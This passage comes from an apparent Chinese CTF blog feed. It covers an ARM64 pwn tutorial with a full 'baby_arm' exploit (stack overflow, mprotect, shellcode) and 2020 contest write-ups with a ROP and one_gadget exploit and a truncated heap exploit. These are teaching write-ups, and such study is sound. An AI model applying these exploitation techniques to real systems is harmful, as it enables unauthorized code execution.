class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">MOV    X1，X0         ;将寄存器X0的值传送到寄存器X1</span><br><span class="line">ADD    X0，X1，X2     ;寄存器X1和X2的值相加后传送到X0</span><br><span class="line">SUB    X0，X1，X2     ;寄存器X1和X2的值相减后传送到X0</span><br><span class="line"></span><br><span class="line">AND    X0，X0，#0xF    ; X0的值与0xF相位与后的值传送到X0</span><br><span class="line">ORR    X0，X0，#9      ; X0的值与9相位或后的值传送到X0</span><br><span class="line">EOR    X0，X0，#0xF    ; X0的值与0xF相异或后的值传送到X0</span><br><span class="line"></span><br><span class="line">LDR    X5，[X6，#0x08]        ；ld：load; X6寄存器加0x08的和的地址值内的数据传送到X5</span><br><span class="line">LDP  x29, x30, [sp, #0x10]    ; ldp :load pair ; 一对寄存器, 从内存读取数据到寄存器</span><br><span class="line"></span><br><span class="line">STR X0, [SP, #0x8]         ；st:store,str:往内存中写数据（偏移值为正）; X0寄存器的数据传送到SP+0x8地址值指向的存储空间</span><br><span class="line">STUR   w0, [x29, #-0x8]   ;往内存中写数据（偏移值为负）</span><br><span class="line">STP  x29, x30, [sp, #0x10]    ;store pair，存放一对数据, 入栈指令</span><br><span class="line"></span><br><span class="line">CBZ  ;比较（Compare），如果结果为零（Zero）就转移（只能跳到后面的指令）</span><br><span class="line">CBNZ ;比较，如果结果非零（Non Zero）就转移（只能跳到后面的指令）</span><br><span class="line">CMP  ;比较指令，相当于SUBS，影响程序状态寄存器CPSR </span><br><span class="line"></span><br><span class="line">B   ;无条件跳转指令，可带条件跳转与cmp配合使用</span><br><span class="line">BL  ;带返回的跳转指令， 返回地址保存到LR（X30），类似于x86的call指令</span><br><span class="line">BLR  ; 带返回的跳转指令，跳转到指令后边跟随寄存器中保存的地址(例：blr    x8 ;跳转到x8保存的地址中去执行)</span><br><span class="line">RET   ;子程序返回指令，返回地址默认保存在LR（X30），即执行PC&#x3D;LR</span><br><span class="line">svc  #0   ;执行系统调用，类似于x86下的syscall和int 80h。</span><br></pre></td></tr></table></figure><h2 id="例题1"><a href="#例题1" class="headerlink" title="例题1"></a>例题1</h2><p>这里以第四届上海市大学生网络安全大赛的<a href="https://drive.google.com/file/d/1zhMEKBhKMpmdWrHr3SEP7QkDTaW30SoF/view" target="_blank" rel="noopener">baby_arm</a>为例讲下arm的pwn。</p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>首先看下保护：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ checksec baby_arm </span><br><span class="line">[*] <span class="string">'/home/ubn/arm/1/baby_arm'</span></span><br><span class="line">    Arch:     aarch64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>可以看到开启了NX保护。</p><p>分析程序可以看到存在两个read函数的调用，第一个read处是输入Name并保存到bss中，第二个则存在栈溢出漏洞：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004007F0 sub_4007F0                              ; CODE XREF: sub_400818+3C↓p</span><br><span class="line">.text:00000000004007F0</span><br><span class="line">.text:00000000004007F0 var_50          &#x3D; -0x50</span><br><span class="line">.text:00000000004007F0</span><br><span class="line">.text:00000000004007F0                 STP             X29, X30, [SP,#var_50]!</span><br><span class="line">.text:00000000004007F4                 MOV             X29, SP</span><br><span class="line">.text:00000000004007F8                 ADD             X0, X29, #0x10</span><br><span class="line">.text:00000000004007FC                 MOV             X2, #0x200</span><br><span class="line">.text:0000000000400800                 MOV             X1, X0</span><br><span class="line">.text:0000000000400804                 MOV             W0, #0</span><br><span class="line">.text:0000000000400808                 BL              .read</span><br><span class="line">.text:000000000040080C                 NOP</span><br><span class="line">.text:0000000000400810                 LDP             X29, X30, [SP+0x50+var_50],#0x50</span><br><span class="line">.text:0000000000400814                 RET</span><br><span class="line">.text:0000000000400814 ; End of function sub_4007F0</span><br></pre></td></tr></table></figure><p>在简化成c语言可以看做是<code>read(0,sp+0x10,0x200);</code>，很明显，可以通过栈溢出来控制执行流。</p><p>另外可以看到存在mprotect函数，因而可以用该函数来修改bss段的属性，从而执行shellcode。</p><p>利用方式有了，然后就再考虑下如何传参给mprotect函数：</p><p>通过ida的汇编窗口可以看到有下面的一个函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000400868 ; Attributes: bp-based frame</span><br><span class="line">.text:0000000000400868</span><br><span class="line">.text:0000000000400868 sub_400868                              ; DATA XREF: start+1C↑o</span><br><span class="line">.text:0000000000400868                                         ; .text:off_400648↑o</span><br><span class="line">.text:0000000000400868</span><br><span class="line">.text:0000000000400868 var_s0          &#x3D;  0</span><br><span class="line">.text:0000000000400868 var_s10         &#x3D;  0x10</span><br><span class="line">.text:0000000000400868 var_s20         &#x3D;  0x20</span><br><span class="line">.text:0000000000400868 var_s30         &#x3D;  0x30</span><br><span class="line">.text:0000000000400868</span><br><span class="line">.text:0000000000400868                 STP             X29, X30, [SP,#-0x40+var_s0]!</span><br><span class="line">.text:000000000040086C                 MOV             X29, SP</span><br><span class="line">.text:0000000000400870                 STP             X21, X22, [SP,#var_s20]</span><br><span class="line">.text:0000000000400874                 ADRP            X21, #off_410DF0@PAGE</span><br><span class="line">.text:0000000000400878                 STP             X19, X20, [SP,#var_s10]</span><br><span class="line">.text:000000000040087C                 ADRP            X20, #off_410DF8@PAGE</span><br><span class="line">.text:0000000000400880                 ADD             X21, X21, #off_410DF0@PAGEOFF</span><br><span class="line">.text:0000000000400884                 ADD             X20, X20, #off_410DF8@PAGEOFF</span><br><span class="line">.text:0000000000400888                 SUB             X20, X20, X21</span><br><span class="line">.text:000000000040088C                 STP             X23, X24, [SP,#var_s30]</span><br><span class="line">.text:0000000000400890                 MOV             X22, X2</span><br><span class="line">.text:0000000000400894                 MOV             W24, W0</span><br><span class="line">.text:0000000000400898                 MOV             X23, X1</span><br><span class="line">.text:000000000040089C                 BL              .init_proc</span><br><span class="line">.text:00000000004008A0                 ASR             X20, X20, #3</span><br><span class="line">.text:00000000004008A4                 CBZ             X20, loc_4008CC</span><br><span class="line">.text:00000000004008A8                 MOV             X19, #0</span><br><span class="line">.text:00000000004008AC</span><br><span class="line">.text:00000000004008AC loc_4008AC                              ; CODE XREF: sub_400868+60↓j</span><br><span class="line">.text:00000000004008AC                 LDR             X3, [X21,X19,LSL#3]</span><br><span class="line">.text:00000000004008B0                 MOV             X2, X22</span><br><span class="line">.text:00000000004008B4                 MOV             X1, X23</span><br><span class="line">.text:00000000004008B8                 MOV             W0, W24</span><br><span class="line">.text:00000000004008BC                 ADD             X19, X19, #1</span><br><span class="line">.text:00000000004008C0                 BLR             X3</span><br><span class="line">.text:00000000004008C4                 CMP             X19, X20</span><br><span class="line">.text:00000000004008C8                 B.NE            loc_4008AC</span><br><span class="line">.text:00000000004008CC</span><br><span class="line">.text:00000000004008CC loc_4008CC                              ; CODE XREF: sub_400868+3C↑j</span><br><span class="line">.text:00000000004008CC                 LDP             X19, X20, [SP,#var_s10]    #x19&#x3D;[sp+0x10];x20&#x3D;[sp+0x18];</span><br><span class="line">.text:00000000004008D0                 LDP             X21, X22, [SP,#var_s20]    #x21&#x3D;[sp+0x20];x22&#x3D;[sp+0x28];</span><br><span class="line">.text:00000000004008D4                 LDP             X23, X24, [SP,#var_s30]    #x23&#x3D;[sp+0x30];x24&#x3D;[sp+0x38];</span><br><span class="line">.text:00000000004008D8                 LDP             X29, X30, [SP+var_s0],#0x40    #x29&#x3D;[sp];x30&#x3D;[sp+0x8];sp&#x3D;sp+0x40;</span><br><span class="line">.text:00000000004008DC                 RET</span><br><span class="line">.text:00000000004008DC ; End of function sub_400868</span><br></pre></td></tr></table></figure><p>这一函数有点类似于x86下的init函数，并且也存在可以设置参的地方。</p><p>首先是loc_4008AC这一区域内，首先执行：<code>x3 = [x29+x19*8]; x2 = x22; x1 = x23; x0 = x24</code>设置前四个寄存器的值，然后将计数器的值即x19加一，再blr跳转到x3。执行完毕后，判断x19是否等于x20，不等于则继续循环，等于则执行到loc_4008CC的内容。</p><p>而loc_4008CC中则是将栈中的值赋予到x19~24寄存器中，并执行返回操作。</p><p>我们可以先后调用loc_4008CC和loc_4008AC，从而完成参数的设置和函数的调用功能。</p><h3 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h3><p>首先，将shellcode写入到bss段中，并且写入后面loc_4008AC中需要调用的函数地址（即mprotect地址和shellcode地址）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pay1 = <span class="string">''</span></span><br><span class="line">pay1 += asm(shellcraft.aarch64.sh())<span class="comment">#size=44</span></span><br><span class="line">pay1 += p64(mprotect)</span><br><span class="line">pay1 += p64(name)</span><br><span class="line">g.send(pay1.ljust(<span class="number">0x200</span>,<span class="string">'\x00'</span>))</span><br></pre></td></tr></table></figure><p>然后利用sub_400868中的gadget，进行参数的设置：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pay2 = <span class="string">"1"</span>*<span class="number">0x48</span></span><br><span class="line">pay2 += p64(gadget1)</span><br><span class="line">pay2 += p64(name)</span><br><span class="line">pay2 += p64(gadget2)</span><br><span class="line">pay2 += p64(<span class="number">0</span>)</span><br><span class="line">pay2 += p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">pay2 += p64(name+<span class="number">44</span>)</span><br><span class="line">pay2 += p64(<span class="number">7</span>)</span><br><span class="line">pay2 += p64(<span class="number">0x1000</span>)</span><br><span class="line">pay2 += p64(bss_start)</span><br><span class="line">g.send(pay2.ljust(<span class="number">0x200</span>,<span class="string">'\x00'</span>))</span><br></pre></td></tr></table></figure><p>这一即完成了参数的设置以及函数的调用，从而可以getshell了（loc_4008AC中的循环会依次调用name+44处所保存的函数地址，即mprotect-&gt;shellcode）。</p><h3 id="最终exp"><a href="#最终exp" class="headerlink" title="最终exp"></a>最终exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">'aarch64'</span></span><br><span class="line">g = gdb.debug(<span class="string">"./baby_arm"</span>)</span><br><span class="line"></span><br><span class="line">mprotect = <span class="number">0x400600</span></span><br><span class="line">name = <span class="number">0x411068</span></span><br><span class="line">gadget1 = <span class="number">0x4008CC</span></span><br><span class="line">gadget2 = <span class="number">0x4008AC</span></span><br><span class="line">bss_start = <span class="number">0x411000</span></span><br><span class="line"></span><br><span class="line">pay1 = <span class="string">''</span></span><br><span class="line">pay1 += asm(shellcraft.aarch64.sh())<span class="comment">#size=44</span></span><br><span class="line">pay1 += p64(mprotect)</span><br><span class="line">pay1 += p64(name)</span><br><span class="line">g.send(pay1.ljust(<span class="number">0x200</span>,<span class="string">'\x00'</span>))</span><br><span class="line"></span><br><span class="line">pay2 = <span class="string">"1"</span>*<span class="number">0x48</span></span><br><span class="line">pay2 += p64(gadget1)</span><br><span class="line">pay2 += p64(name)</span><br><span class="line">pay2 += p64(gadget2)</span><br><span class="line">pay2 += p64(<span class="number">0</span>)</span><br><span class="line">pay2 += p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">pay2 += p64(name+<span class="number">44</span>)</span><br><span class="line">pay2 += p64(<span class="number">7</span>)</span><br><span class="line">pay2 += p64(<span class="number">0x1000</span>)</span><br><span class="line">pay2 += p64(bss_start)</span><br><span class="line">g.send(pay2.ljust(<span class="number">0x200</span>,<span class="string">'\x00'</span>))</span><br><span class="line">g.interactive()</span><br></pre></td></tr></table></figure><h2 id="例题2"><a href="#例题2" class="headerlink" title="例题2"></a>例题2</h2><p>另一种pwntools的编写方式详看<a href="https://nuoye-blog.github.io/2020/06/26/22c5c626/">2020第五空间线上初赛-WP | nuoye’s blog</a>中的pwnme。</p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p>pwnlib.qemu — QEMU Utilities — pwntools 4.1.2 documentation  <a href="http://docs.pwntools.com/en/stable/qemu.html?highlight=qemu#pwnlib.qemu.ld_prefix" target="_blank" rel="noopener">http://docs.pwntools.com/en/stable/qemu.html?highlight=qemu#pwnlib.qemu.ld_prefix</a></p><p>ARM PWN 环境搭建和测试_u012655643的博客-CSDN博客_arm pwn  <a href="https://blog.csdn.net/u012655643/article/details/84584974" target="_blank" rel="noopener">https://blog.csdn.net/u012655643/article/details/84584974</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;原文：&lt;a href=&quot;https://mp.weixin.qq.com/s/AwNPbG9kT3Wb-FcjbQJq4w&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://mp.weixin.qq.com/s/AwNPbG9kT3Wb-Fcj
      
    
    </summary>
    
    
      <category term="pwn" scheme="https://nuoye-blog.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nuoye-blog.github.io/tags/pwn/"/>
    
      <category term="ctf" scheme="https://nuoye-blog.github.io/tags/ctf/"/>
    
      <category term="arm" scheme="https://nuoye-blog.github.io/tags/arm/"/>
    
      <category term="qemu" scheme="https://nuoye-blog.github.io/tags/qemu/"/>
    
  </entry>
  
  <entry>
    <title>2020第五空间线上初赛-WP</title>
    <link href="https://nuoye-blog.github.io/2020/06/26/22c5c626/"/>
    <id>https://nuoye-blog.github.io/2020/06/26/22c5c626/</id>
    <published>2020-06-25T16:30:00.000Z</published>
    <updated>2020-06-25T16:46:16.982Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2020第五空间线上赛WP"><a href="#2020第五空间线上赛WP" class="headerlink" title="2020第五空间线上赛WP"></a>2020第五空间线上赛WP</h1><h2 id="loop"><a href="#loop" class="headerlink" title="loop"></a>loop</h2><p>循环解压即可获得flag，直接上脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">os.system(<span class="string">"unzip -o zipfile"</span>)</span><br><span class="line">os.system(<span class="string">"tar -xvf tarfile"</span>)</span><br></pre></td></tr></table></figure><h2 id="twice"><a href="#twice" class="headerlink" title="twice"></a>twice</h2><p>主要漏洞点：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">int64 __fastcall <span class="title">sub_4007A9</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// [rsp+14h] [rbp-6Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+18h] [rbp-68h]</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [rsp+1Ch] [rbp-64h]</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">88</span>]; <span class="comment">// [rsp+20h] [rbp-60h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+78h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x50</span>uLL);</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="string">'&gt;'</span>);</span><br><span class="line">  v3 = sub_40076D(<span class="number">0x50</span>);</span><br><span class="line">  <span class="keyword">if</span> ( a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a1 != <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">    v2 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v2 = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v4 = <span class="built_in">read</span>(<span class="number">0</span>, s, v3);</span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="keyword">if</span> ( !a1 )</span><br><span class="line">    s[v4 - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中a1为count，sub_40076D函数根据count是否为1返回0x70或0x59。</p><p>并且read函数的第三个参数v3在汇编函数中取值是根据：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000400823                 mov     eax, [rbp-68h]</span><br><span class="line">.text:0000000000400826                 movsxd  rdx, eax</span><br></pre></td></tr></table></figure><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>首先第一执行sub_4007A9时count为0，即实现<code>read(0, s, 0x59)</code>。故直接传入’a’*0x59即可leak出canary和stack，以便后续rop：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">p.send(<span class="string">"a"</span>*<span class="number">0x59</span>)</span><br><span class="line">p.recvuntil(<span class="string">"a"</span>*<span class="number">0x58</span>)</span><br><span class="line">canary = u64(p.recv(<span class="number">8</span>))<span class="number">-0x61</span></span><br><span class="line"><span class="keyword">print</span> hex(canary)</span><br><span class="line">stack = u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>)</span><br><span class="line"><span class="keyword">print</span> hex(stack)</span><br></pre></td></tr></table></figure><p>接着控制rbp指针，再直接跳转回0x400823，从而控制可输入字符串的大小：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">vuln &#x3D; 0x400823</span><br><span class="line">pay &#x3D; p64(0x100)*2</span><br><span class="line">pay +&#x3D; &#39;a&#39;*0x48</span><br><span class="line">pay +&#x3D; p64(canary)</span><br><span class="line">pay +&#x3D; p64(stack)</span><br><span class="line">pay +&#x3D; p64(vuln)</span><br><span class="line">p.send(pay.ljust(0x70,&#39;\x00&#39;))</span><br><span class="line">p.recv()</span><br></pre></td></tr></table></figure><p>接着就可以输入任意长度的rop串从而执行leak出libc等目的（需要注意的是因为rsp的原因所以执行rop的地方在read函数中）。这里先leak出libc地址，并且返回到sub_4007A9函数中，此时count仍为1，从而可以比较方便的实现一次溢出，从而用onegadget来getshell：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pay = <span class="string">'a'</span>*<span class="number">0x58</span></span><br><span class="line">pay += p64(pop_rdi)</span><br><span class="line">pay += p64(libc_start_main_got)</span><br><span class="line">pay += p64(puts_plt)</span><br><span class="line">pay += p64(<span class="number">0x4007A9</span>)</span><br><span class="line">p.send(pay.ljust(<span class="number">0x100</span>,<span class="string">'\x00'</span>))</span><br><span class="line">p.recv(<span class="number">1</span>)</span><br><span class="line">libc.address = u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>) - libc.sym[<span class="string">'__libc_start_main'</span>]</span><br><span class="line"><span class="keyword">print</span> hex(libc.address)</span><br><span class="line"></span><br><span class="line">pay = <span class="string">'a'</span>*<span class="number">0x58</span></span><br><span class="line">pay += p64(canary)</span><br><span class="line">pay += p64(stack)</span><br><span class="line">pay += p64(libc.address+one[<span class="number">1</span>])</span><br><span class="line">p.send(pay)</span><br></pre></td></tr></table></figure><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">"./pwn"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./pwn"</span>).libc</span><br><span class="line"><span class="comment">#p = remote("121.36.59.116","9999")</span></span><br><span class="line">vuln = <span class="number">0x400823</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000400923</span></span><br><span class="line">puts_plt = <span class="number">0x4005C0</span></span><br><span class="line">libc_start_main_got = <span class="number">0x601040</span></span><br><span class="line">pop_rbp = <span class="number">0x4008B6</span></span><br><span class="line">leave = <span class="number">0x40087a</span></span><br><span class="line"></span><br><span class="line">p.send(<span class="string">"a"</span>*<span class="number">0x59</span>)</span><br><span class="line">p.recvuntil(<span class="string">"a"</span>*<span class="number">0x58</span>)</span><br><span class="line">canary = u64(p.recv(<span class="number">8</span>))<span class="number">-0x61</span></span><br><span class="line"><span class="keyword">print</span> hex(canary)</span><br><span class="line">stack = u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>)</span><br><span class="line"><span class="keyword">print</span> hex(stack)</span><br><span class="line"></span><br><span class="line">read = <span class="number">0x4007A9</span></span><br><span class="line">one = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">pay = p64(<span class="number">0x100</span>)*<span class="number">2</span></span><br><span class="line">pay += <span class="string">'a'</span>*<span class="number">0x48</span></span><br><span class="line">pay += p64(canary)</span><br><span class="line">pay += p64(stack)</span><br><span class="line">pay += p64(vuln)</span><br><span class="line">p.send(pay.ljust(<span class="number">0x70</span>,<span class="string">'\x00'</span>))</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">pay = <span class="string">'a'</span>*<span class="number">0x58</span></span><br><span class="line">pay += p64(pop_rdi)</span><br><span class="line">pay += p64(libc_start_main_got)</span><br><span class="line">pay += p64(puts_plt)</span><br><span class="line">pay += p64(read)</span><br><span class="line">p.send(pay.ljust(<span class="number">0x100</span>,<span class="string">'\x00'</span>))</span><br><span class="line">p.recv(<span class="number">1</span>)</span><br><span class="line">libc.address = u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>) - libc.sym[<span class="string">'__libc_start_main'</span>]</span><br><span class="line"><span class="keyword">print</span> hex(libc.address)</span><br><span class="line"></span><br><span class="line">pay = <span class="string">'a'</span>*<span class="number">0x58</span></span><br><span class="line">pay += p64(canary)</span><br><span class="line">pay += p64(stack)</span><br><span class="line">pay += p64(libc.address+one[<span class="number">1</span>])</span><br><span class="line">p.send(pay)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="pwnme"><a href="#pwnme" class="headerlink" title="pwnme"></a>pwnme</h2><p>arm的pwn，比较简单，难的是环境的搭建以及关于堆漏洞的发现。</p><p>不知道是什么版本的libc，尝试了下发现存在fastbin和unsortbin类似的管理方式。</p><p>因为对edit没有限制大小，可以实现堆溢出，从而修改fd达到任意申请的目的（地址有一定的偏移，多试几遍就能发现）。</p><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p>首先通过溢出修改fd，从而达到重复申请同一堆块的目的，进而可以利用unsortbin来leak出libc地址。接着继续通过修改fd的方式控制堆指针，进而指向free_hook，把free_hook改为system，最终getshell。</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span 